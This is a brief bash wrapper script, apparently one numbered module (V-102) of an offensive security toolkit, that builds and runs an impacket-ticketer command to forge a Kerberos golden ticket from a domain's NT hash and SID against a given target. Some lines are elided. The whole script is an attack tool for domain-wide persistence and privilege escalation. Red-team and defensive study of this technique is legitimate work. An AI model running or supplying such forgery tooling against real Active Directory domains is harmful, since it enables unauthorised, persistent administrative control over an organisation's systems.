#!/usr/bin/env bash
# V-102.sh — Golden ticket forgery
# Category: Host, Software and internal architecture
# Tool: impacket-ticketer
# Usage: bash V-102.sh <SESSION> <TARGET>
# Place at: ~/Desktop/trinetra/scripts/hexstrike/V-102.sh
set -euo pipefail

SESSION="${1:?ERROR: usage: bash V-102.sh <session> <target>}"
TARGET="${2:?ERROR: usage: bash V-102.sh <session> <target>}"
...
CMD="impacket-ticketer -nthash HASH -domain-sid SID -domain DOMAIN golden"

echo "[hex] V-102: Golden ticket forgery → $TARGET"
...
python3 - \
    ...
    "V-102" "Golden ticket forgery" "Host, Software and internal architecture" "impacket-ticketer" \
